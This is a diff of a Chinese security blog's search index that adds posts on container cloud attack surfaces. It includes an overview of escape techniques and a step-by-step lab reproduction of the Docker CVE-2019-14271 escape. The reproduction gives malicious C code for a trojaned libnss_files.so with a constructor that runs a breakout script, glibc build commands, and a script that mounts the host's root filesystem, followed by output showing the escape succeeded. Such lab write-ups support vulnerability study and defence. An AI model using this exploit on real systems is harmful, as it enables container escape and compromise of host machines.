@@ -2279,7 +2279,7 @@ Any-Header: burpcollaborator.net</pre>
       </tags>
   </entry>
   <entry>
-    <title>容器云攻防体系介绍</title>
+    <title></title>
     <url>/%E5%AE%B9%E5%99%A8%E4%BA%91%E6%94%BB%E9%98%B2%E4%BD%93%E7%B3%BB%E4%BB%8B%E7%BB%8D/</url>
     <content><![CDATA[<blockquote>
 <p>上德不德，是以有德；下德不失德，是以无德。</p>
@@ -2287,7 +2287,36 @@ Any-Header: burpcollaborator.net</pre>
 <p>容器云可以看成是云原生应用的基础设施，包括容器和容器编排平台，容器编排平台目前一般使用的都是Kubernetes。本文主要分析容器和Kubernetes的攻击面以及如何防御。</p>
 <span id="more"></span>
 
-<h2 id="1-容器"><a href="#1-容器" class="headerlink" title="1. 容器"></a>1. 容器</h2><p>未完待续……</p>
+<h2 id="1-容器"><a href="#1-容器" class="headerlink" title="1. 容器"></a>1. 容器</h2><p>容器的概念大家都比较了解，我做个简单的介绍。容器使用到两个关机技术Namespaces和Cgroups。Linux Namespaces用于隔离容器的资源，Cgroups则用于限制资源。两者结合就把应用限制在一个容器这个盒子里，互不影响。</p>
+<h2 id="2-Kubernetes"><a href="#2-Kubernetes" class="headerlink" title="2. Kubernetes"></a>2. Kubernetes</h2><p>常见的Kubernetes集群结构图如下，Master节点是集群的控制节点，Node节点则是集群的工作节点。</p>
+<p><img src="../images/pic/k8s.png"></p>
+<p><img src="../images/pic/k8s18.jpg"> </p>
+<p><strong>Master节点：</strong></p>
+<p>master节点是负责管理其他节点的主节点</p>
+<p><strong>Node：</strong></p>
+<p>每个Node节点可以看做一个物理节点。</p>
+<p><strong>pod:</strong></p>
+<p>看第二张图片，每个node上运行着pod，pod相当于跑的一个容器，并且可以修改副本数量，让同一个pod配置文件管理多个容器副本。</p>
+<p><strong>API Server:</strong></p>
+<p>通过API Server接口可以对集群进行管理</p>
+<p><strong>kubelet:</strong></p>
+<p>每个节点都装有kubelet，它负责管理自己节点的Pod，同时，Master节点也是通过控制其他节点的kubelet来对其他节点的Pod进行管理。</p>
+<p><strong>etcd：</strong></p>
+<p>所有master的持续状态都存在etcd的一个实例中。这可以很好地存储配置数据。</p>
+<h2 id="3-容器云攻击面"><a href="#3-容器云攻击面" class="headerlink" title="3. 容器云攻击面"></a>3. 容器云攻击面</h2><p><img src="../images/pic/k8s0.jpg"> </p>
+<h3 id="3-1-容器逃逸"><a href="#3-1-容器逃逸" class="headerlink" title="3.1 容器逃逸"></a>3.1 容器逃逸</h3><p>容器安全中一个重要的攻击点就是容器逃逸，容器逃逸就是从容器中进行权限提升获取宿主机的权限。</p>
+<p>容器逃逸手法有很多，我们做个简单的介绍。</p>
+<p><strong>危险目录挂载：</strong></p>
+<p>如果我们将宿主机根目录、root目录、/root/.ssh等危险目录挂载进了容器，这是很危险的一件事。比如在启动容器的时候将根目录挂载进容器，那么在容器里面可以使用chroot将宿主机目录当做容器的根目录，然后反弹一个shell获取宿主机的shell，或者写入ssh公钥或者写入定时任务等都可以获取到宿主机的shell。从而逃逸容器。</p>
+<p>除了上面说的挂载危险目录，还有两个特殊的目录，Docker Socket和procfs。如果宿主机将Docker Socket的目录/var/run/docker.sock 挂载进行容器，也就是说此容器可以管理其他容器，那么我们就是可以在容器里面创建一个挂载危险目录的容器从而实现逃逸；procfs是一个伪文件系统，存储的是当前内核运行状态的一系列特殊文件，从2.6.19内核版本开始，加入了一个新特性，在/proc/sys/kernel/core_pattern中，如果在该文件中的首个字符是管道符（|），那么该行的剩余内容将被当做脚本进行解析，那么我们就可以在管道符后写入后门程序达到命令执行的效果，如果把宿主机的/proc目录挂载进来，那么我们就可以把这个后门写入到宿主机上，从而实现逃逸。</p>
+<p><strong>容器相关组件漏洞：</strong></p>
+<p>CVE-2019-5736 runC容器逃逸漏洞：</p>
+<p>runC是Docker内置的一个基础客户端工具，在存在漏洞版本的docker中，容器内部通过proc虚拟文件系统访问到runc文件并写入恶意代码，怎么触发呢？触发使用到了proc目录下的/proc/PID/exe，它指向进程自身对应的本地文件。比如如果我们使用docker exec -it /bin/sh，如果我们替换掉容器里的/bin/sh为/proc/[runC-PID]/exe，那么就会调用我们刚刚写入恶意代码的runc，导致恶意命令被执行，由于runc是在docker守护进程里具有宿主机的root权限，相当于逃逸了容器。</p>
+<p>CVE-2018-15664:符号链接替换漏洞：</p>
+<p>CVE-2018-15664是一个条件竞争引起的漏洞，当用户执行docker cp命令的时候Docker守护进程会先检查复制的路径，检查的时候如果有容器内部的符号链接，会先解析符号链接，然后放置，等待检查完后进行复制操作。这其中存在一个间隙，如果我们在执行复制之前，将执行容器内的路径替换成一个符号链接，那么复制的时候，宿主机的docker就会解析的这个符号链接，就会以docker守护进程的权限把容器内的文件复制到宿主机，这个漏洞比较鸡肋。攻击场景局限在非root用户的宿主机权限，并且有docker交互的权限，这时候可以使用这个方法修改/etc/shadow文件实现提权，并且由于需要条件竞争成功率并不高。如果有了这些权限完全可以启动一个特权容器进行逃逸。</p>
+<p>CVE-2019-14271:加载不受信任的动态链接：</p>
+<p>在存在漏洞版本的Docker中，在执行Docker cp命令后，Docker守护进程会启动一个docker-tar进程来完成这项复制任务。docker-tar会在容器里执行chroot后加载一些动态链接库，如果我们在容器里放置恶意的动态链接库，就会被加载到容器外的docker-tar(root权限)运行。</p>
+<p><strong>Capabilites安全问题:</strong></p>
 ]]></content>
       <categories>
         <category>云原生安全</category>
@@ -2640,6 +2669,7 @@ Any-Header: burpcollaborator.net</pre>
 <h3 id="3-3-CVE-2019-5736-runc容器逃逸漏洞"><a href="#3-3-CVE-2019-5736-runc容器逃逸漏洞" class="headerlink" title="3.3 CVE-2019-5736 runc容器逃逸漏洞"></a>3.3 CVE-2019-5736 runc容器逃逸漏洞</h3><p><strong>影响版本：</strong></p>
 <p>Docker  &lt; 18.09.2</p>
 <p>runC &lt;= 1.0-rc6</p>
+<p>runC是Docker内置的一个基础客户端工具，在存在漏洞版本的docker中，容器内部通过proc虚拟文件系统访问到runc文件并写入恶意代码，怎么触发呢？触发使用到了proc目录下的/proc/PID/exe，它指向进程自身对应的本地文件。比如如果我们使用docker exec -it /bin/sh，如果我们替换掉容器里的/bin/sh为/proc/[runC-PID]/exe，那么就会调用我们刚刚写入恶意代码的runc，导致恶意命令被执行，由于runc是在docker守护进程里具有宿主机的root权限，相当于逃逸了容器。</p>
 <p><strong>环境搭建：</strong></p>
 <p>使用<a href="https://github.com/Metarget/metarget/blob/master/README-zh.md">metarget</a>搭建环境(注：要在ubuntu下使用)</p>
 <figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo</span> ./metarget cnv install cve-<span class="number">2019</span>-<span class="number">5736</span></span><br></pre></td></tr></table></figure>
@@ -2673,7 +2703,77 @@ Any-Header: burpcollaborator.net</pre>
 
 
 
-<h3 id="3-4-总结"><a href="#3-4-总结" class="headerlink" title="3.4 总结"></a>3.4 总结</h3><p>这个漏洞虽然可以逃逸，但是利用难度也是挺大的，需要宿主机用户进入容器才能触发。还有一些其他的动态连接库利用以及条件竞争产生的符号链接替换也可以用来逃逸，比如：CVE-2018-15664:符号链接替换漏洞，CVE-2019-14271:加载不受信任的动态链接。但是利用难度更大，实际使用效果不佳，这里不做说明。</p>
+<h3 id="3-4-CVE-2018-15664-符号链接替换漏洞"><a href="#3-4-CVE-2018-15664-符号链接替换漏洞" class="headerlink" title="3.4 CVE-2018-15664:符号链接替换漏洞"></a>3.4 CVE-2018-15664:符号链接替换漏洞</h3><p>影响版本：Docker &lt; 18.06.1-ce-rc2</p>
+<p>CVE-2018-15664是一个条件竞争引起的漏洞，当用户执行docker cp命令的时候Docker守护进程会先检查复制的路径，检查的时候如果有容器内部的符号链接，会先解析符号链接，然后放置，等待检查完后进行复制操作。这其中存在一个间隙，如果我们在执行检查之后复制之前，将执行容器内已经解析成路径的符号链接再次替换成一个符号链接，那么复制的时候，宿主机的docker守护进程就会解析的这个符号链接，就会以docker守护进程的权限把容器内的文件复制到宿主机，这个漏洞比较鸡肋。攻击场景局限在非root用户的宿主机权限，并且有docker交互的权限，这时候可以使用这个方法修改/etc/shadow文件实现提权，并且由于需要条件竞争成功率并不高。如果有了这些权限完全可以启动一个特权容器进行逃逸。由于利用条件过于苛刻，实际价值不大，这里不做复现。</p>
+<h3 id="3-5-CVE-2019-14271-加载不受信任的动态链接"><a href="#3-5-CVE-2019-14271-加载不受信任的动态链接" class="headerlink" title="3.5 CVE-2019-14271:加载不受信任的动态链接"></a>3.5 CVE-2019-14271:加载不受信任的动态链接</h3><p>影响版本 Docker 19.03.x 和若干非正式版</p>
+<p>在存在漏洞版本的Docker中，在执行Docker cp命令后，Docker守护进程会启动一个docker-tar进程来完成这项复制任务。docker-tar会在容器里执行chroot后加载一些动态链接库，如果我们在容器里放置恶意的动态链接库，就会被加载到容器外的docker-tar(root权限)运行。</p>
+<p><strong>环境搭建：</strong></p>
+<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">./metarget cnv install cve<span class="string">-2019</span><span class="string">-14271</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>确定目标：</strong></p>
+<p>如何找出docker-tar启动后会加载的容器内动态链接库呢？最直接的是分析docker源码，但是比较费时间；另一种思路是执行一次docker cp命令，观察在这个过程中容器内部哪些动态链接库被加载了。我们采用第二种方式，需要使用inotify机制，用来监控文件系统变化。</p>
+<ol>
+<li><p>启动一个容器：</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sudo docker <span class="builtin-name">run</span> -itd <span class="attribute">--name</span>=test ubuntu</span><br></pre></td></tr></table></figure></li>
+<li><p>确定容器绝对路径：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shadowflow@ubuntu:~/metarget$ sudo docker <span class="built_in">exec</span> -it <span class="built_in">test</span> cat /proc/mounts | grep docker</span><br><span class="line">overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/OPYJT6AWT3IWJEPHAFYV5KJZCN:/var/lib/docker/overlay2/l/E4IQFOCWDQVZR3SHN5ZEMRI2ZX,upperdir=/var/lib/docker/overlay2/90cb520a4b6ef60f15fcc1b962328150829c0e5fb7c1ecc72f82dfce3d7ff874/diff,workdir=/var/lib/docker/overlay2/90cb520a4b6ef60f15fcc1b962328150829c0e5fb7c1ecc72f82dfce3d7ff874/work,xino=off 0 0</span><br></pre></td></tr></table></figure>
+
+<p>根据上文信息收集的内容，可以确定容器根目录为<code>/var/lib/docker/overlay2/90cb520a4b6ef60f15fcc1b962328150829c0e5fb7c1ecc72f82dfce3d7ff874/merged</code></p>
+</li>
+<li><p>使用inotifywait工具监听容器</p>
+<p>在另一个终端执行监听容器内的lib目录</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shadowflow@ubuntu:~/metarget$ sudo apt install -y inotify-tools</span><br><span class="line">[sudo] password <span class="keyword">for</span> shadowflow: </span><br><span class="line">Reading package lists... Done</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">shadowflow@ubuntu:~/metarget$ sudo inotifywait -mr /var/lib/docker/overlay2/90cb520a4b6ef60f15fcc1b962328150829c0e5fb7c1ecc72f82dfce3d7ff874/merged/lib/</span><br><span class="line">Setting up watches.  Beware: since -r was given, this may take a <span class="keyword">while</span>!</span><br><span class="line">Watches established.</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+<li><p>执行docker cp</p>
+<p>在原来的终端执行docker cp</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shadowflow@ubuntu:~/metarget$ sudo docker cp <span class="built_in">test</span>:/etc/passwd ./</span><br><span class="line">Error response from daemon: error processing tar file: docker-tar: relocation error: /lib/x86_64-linux-gnu/libnss_files.so.2: symbol __libc_readline_unlocked version GLIBC_PRIVATE not defined <span class="keyword">in</span> file libc.so.6 with link time reference</span><br><span class="line">: <span class="built_in">exit</span> status 127</span><br></pre></td></tr></table></figure>
+
+<p>监控到以下输出</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shadowflow@ubuntu:~/metarget$ sudo inotifywait -mr /var/lib/docker/overlay2/90cb520a4b6ef60f15fcc1b962328150829c0e5fb7c1ecc72f82dfce3d7ff874/merged/lib/</span><br><span class="line">Setting up watches.  Beware: since -r was given, this may take a <span class="keyword">while</span>!</span><br><span class="line">Watches established.</span><br><span class="line">/var/lib/docker/overlay2/90cb520a4b6ef60f15fcc1b962328150829c0e5fb7c1ecc72f82dfce3d7ff874/merged/lib/x86_64-linux-gnu/ OPEN libnss_files-2.31.so</span><br><span class="line">/var/lib/docker/overlay2/90cb520a4b6ef60f15fcc1b962328150829c0e5fb7c1ecc72f82dfce3d7ff874/merged/lib/x86_64-linux-gnu/ ACCESS libnss_files-2.31.so</span><br><span class="line">/var/lib/docker/overlay2/90cb520a4b6ef60f15fcc1b962328150829c0e5fb7c1ecc72f82dfce3d7ff874/merged/lib/x86_64-linux-gnu/ CLOSE_NOWRITE,CLOSE libnss_files-2.31.so</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们可以看见docker-tar加载了libnss_files-2.31.so。那么我们就构造一个恶意的libnss_files-2.31.so来替换它。</p>
+</li>
+</ol>
+<p><strong>构造动态链接库：</strong></p>
+<p>先下载<a href="https://ftp.gnu.org/gnu/glibc/">Glibc库</a>，我这里下载2.31版本<a href="https://ftp.gnu.org/gnu/glibc/glibc-2.3.1.tar.gz%E3%80%82%E6%9C%80%E5%88%9D%E5%B0%9D%E8%AF%952.3.1%E5%9B%A0%E4%B8%BA%E5%92%8Cgcc%E7%89%88%E6%9C%AC%E5%92%8Cmake%E7%89%88%E6%9C%AC%E5%86%B2%E7%AA%81%E5%AF%BC%E8%87%B4%E7%BC%96%E8%AF%91%E4%B8%8D%E6%88%90%E5%8A%9F%EF%BC%8C%E6%8D%A2%E6%88%90%E4%BA%86%E3%80%8A%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8%EF%BC%9A%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA%E3%80%8B%E7%AB%8B%E7%9A%842.27%E7%89%88">https://ftp.gnu.org/gnu/glibc/glibc-2.3.1.tar.gz。最初尝试2.3.1因为和gcc版本和make版本冲突导致编译不成功，换成了《云原生安全：攻防实践与体系构建》立的2.27版</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shadowflow@ubuntu:~$ mkdir ngu</span><br><span class="line">shadowflow@ubuntu:~$ <span class="built_in">cd</span> ngu</span><br><span class="line">shadowflow@ubuntu:~/ngu$ wget https://ftp.gnu.org/gnu/glibc/glibc-2.27.tar.bz2</span><br><span class="line">shadowflow@ubuntu:~/ngu$ tar -jxvf glibc-2.27.tar.bz2</span><br></pre></td></tr></table></figure>
+
+<p>注释编译限制：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shadowflow@ubuntu:~/ngu$ vim glibc-2.27/Makeconfig</span><br></pre></td></tr></table></figure>
+
+<p>注释掉：</p>
+<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">gccwarn-c</span> = -Wstrict-prototypes -Wold-style-definition</span><br></pre></td></tr></table></figure>
+
+<p>添加恶意代码:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shadowflow@ubuntu:~/ngu$ vim glibc-2.27/nss/nss_files/files-service.c</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// content should be added into nss/nss_files/files-service.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 容器内部原始 libnss_files.so.2 文件备份位置</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ORIGINAL_LIBNSS <span class="meta-string">&quot;/original_libnss_files.so.2&quot;</span></span></span><br><span class="line"><span class="comment">// 恶意 libnss_files.so.2 文件位置</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LIBNSS_PATH <span class="meta-string">&quot;/lib/x86_64-linux-gnu/libnss_files.so.2&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_priviliged</span><span class="params">()</span></span>;</span><br><span class="line"> </span><br><span class="line">__attribute__ ((constructor)) <span class="function"><span class="keyword">void</span> <span class="title">run_at_link</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">char</span> * argv_break[<span class="number">2</span>];</span><br><span class="line">  <span class="comment">// 判断是否容器外是高权限执行，即 docker-tar</span></span><br><span class="line">     <span class="keyword">if</span> (!is_priviliged())</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 攻击执行一次即可，用原始的替换备份的库文件</span></span><br><span class="line">  <span class="comment">// 避免后续对环境产生影响</span></span><br><span class="line">     rename(ORIGINAL_LIBNSS, LIBNSS_PATH);</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 以 docker-tar 运行 /breakout 恶意脚本</span></span><br><span class="line">  	<span class="keyword">if</span> (!fork()) &#123;</span><br><span class="line">        <span class="comment">// Child runs breakout</span></span><br><span class="line">        argv_break[<span class="number">0</span>] = strdup(<span class="string">&quot;/breakout&quot;</span>);</span><br><span class="line">        argv_break[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">        execve(<span class="string">&quot;/breakout&quot;</span>, argv_break, <span class="literal">NULL</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">        wait(<span class="literal">NULL</span>); <span class="comment">// Wait for child</span></span><br><span class="line"> </span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_priviliged</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     FILE * proc_file = fopen(<span class="string">&quot;/proc/self/exe&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">     <span class="keyword">if</span> (proc_file != <span class="literal">NULL</span>) &#123;</span><br><span class="line">           fclose(proc_file);</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// can open so /proc exists, not privileged</span></span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// we&#x27;re running in the context of docker-tar</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shadowflow@ubuntu:~/ngu$ mkdir glibc-build</span><br><span class="line">shadowflow@ubuntu:~/ngu$ <span class="built_in">cd</span> glibc-build/</span><br><span class="line">shadowflow@ubuntu:~/ngu/glibc-build$ sudo apt install bison</span><br><span class="line">shadowflow@ubuntu:~/ngu/glibc-build$ sudo apt install gawk</span><br><span class="line">shadowflow@ubuntu:~/ngu/glibc-build$ sudo ../glibc-2.27/configure --prefix=/home/shadowflow/gnu/glibc-build/configur1/</span><br><span class="line">shadowflow@ubuntu:~/ngu/glibc-build$ sudo make</span><br></pre></td></tr></table></figure>
+
+<p>第一次编译比较慢，编译好后恶意文件为<code>~/ngu/glibc-build/nss/libnss_db.so</code></p>
+<p>编写exp:</p>
+<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">shadowflow<span class="variable">@ubuntu</span><span class="symbol">:~</span><span class="variable">$ </span>vim breakout</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">umount /host_fs &amp;&amp; rm -rf /host_fs</span><br><span class="line">mkdir /host_fs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mount -t proc none /proc     # mount the host&#x27;s procfs over /proc</span><br><span class="line">cd /proc/1/root              # chdir to host&#x27;s root</span><br><span class="line">mount --bind . /host_fs      # mount host root at /host_fs</span><br></pre></td></tr></table></figure>
+
+<p>启动受害者容器：</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">shadowflow@ubuntu:~$ sudo docker <span class="builtin-name">run</span> -itd <span class="attribute">--name</span>=victim ubuntu</span><br></pre></td></tr></table></figure>
+
+<p>复制breakout到容器并赋予执行权限：</p>
+<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">shadowflow<span class="variable">@ubuntu</span><span class="symbol">:~</span><span class="variable">$ </span>sudo docker cp ./breakout <span class="symbol">victim:</span>/breakout</span><br><span class="line">shadowflow<span class="variable">@ubuntu</span><span class="symbol">:~</span><span class="variable">$ </span>sudo docker exec -it victim /bin/bash</span><br><span class="line">root<span class="variable">@e6885e01f359</span><span class="symbol">:/</span><span class="comment"># chmod 777 /breakout</span></span><br></pre></td></tr></table></figure>
+
+<p>将容器内原有的libnss_files.so拷贝到容器根目录并重命名：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@e6885e01f359:/<span class="comment"># ls -l /lib/x86_64-linux-gnu/ | grep libnss_files</span></span><br><span class="line">-rw-r--r--  1 root root   51832 Dec 16  2020 libnss_files-2.31.so</span><br><span class="line">lrwxrwxrwx  1 root root      20 Dec 16  2020 libnss_files.so.2 -&gt; libnss_files-2.31.so</span><br><span class="line">root@e6885e01f359:/<span class="comment"># cp /lib/x86_64-linux-gnu/libnss_files-2.31.so /original_libnss_files.so.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#注意：这里也可以从宿主机复制</span></span><br><span class="line">readlink /lib/x86_64-linux-gnu/libnss_files.so.2 <span class="comment">#确定复制的文件</span></span><br><span class="line">shadowflow@ubuntu:~$ sudo docker cp ~/ngu/glibc-build/nss/libnss_files.so victim:/lib/x86_64-linux-gnu/libnss_files.so.2</span><br></pre></td></tr></table></figure>
+
+<p>将恶意文件复制到容器/lib/x86_64-linux-gnu/目录并重名名为libnss_files.so.2:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shadowflow@ubuntu:~$ sudo docker cp ~/ngu/glibc-build/nss/libnss_files.so victim:/lib/x86_64-linux-gnu/libnss_files.so.2</span><br></pre></td></tr></table></figure>
+
+<p>执行docker cp，并查看结果:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shadowflow@ubuntu:~$ sudo docker cp victim:/etc/passwd ./</span><br><span class="line">shadowflow@ubuntu:~$ sudo docker <span class="built_in">exec</span> -it /bin/bash</span><br><span class="line"><span class="string">&quot;docker exec&quot;</span> requires at least 2 arguments.</span><br><span class="line">See <span class="string">&#x27;docker exec --help&#x27;</span>.</span><br><span class="line"></span><br><span class="line">Usage:  docker <span class="built_in">exec</span> [OPTIONS] CONTAINER COMMAND [ARG...]</span><br><span class="line"></span><br><span class="line">Run a <span class="built_in">command</span> <span class="keyword">in</span> a running container</span><br><span class="line">shadowflow@ubuntu:~$ sudo docker <span class="built_in">exec</span> -it victim /bin/bash</span><br><span class="line">root@82371c2be22f:/<span class="comment"># ls host_fs/</span></span><br><span class="line">bin  boot  cdrom  dev  etc  home  initrd.img  initrd.img.old  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  swapfile  sys  tmp  usr  var  vmlinuz  vmlinuz.old</span><br><span class="line">root@82371c2be22f:/<span class="comment"># </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>发现已经将宿主机的根目录挂载进来容器的host_fs目录，可以进行逃逸了。</p>
 <h2 id="4-通过Capabilities进行逃逸"><a href="#4-通过Capabilities进行逃逸" class="headerlink" title="4. 通过Capabilities进行逃逸"></a>4. 通过Capabilities进行逃逸</h2><h3 id="4-1-理解linux-Capabilities"><a href="#4-1-理解linux-Capabilities" class="headerlink" title="4.1 理解linux Capabilities"></a>4.1 理解linux Capabilities</h3><p>Linux内核中的Capabilities特性用于划分特权集，以便进程可以只分配“执行特定功能”的特权。<br> 在引入此特性前，如果进程需要使用网络，则必须使用root来运行，通常是sudo或者添加suid，那么普通用户在使用ping时，ping就可以运行任何特权。引入Capabilities特性后，可以通过给ping应用添加CAP_NET_RAW特权集，使其具有使用网络的特权集，而不具备其他特权集。缺省ping具有cap_net_admin和cap_net_raw特权集</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ <span class="built_in">getcap</span> /bin/ping</span><br><span class="line">/bin/ping = cap_net_raw+ep</span><br></pre></td></tr></table></figure>
 
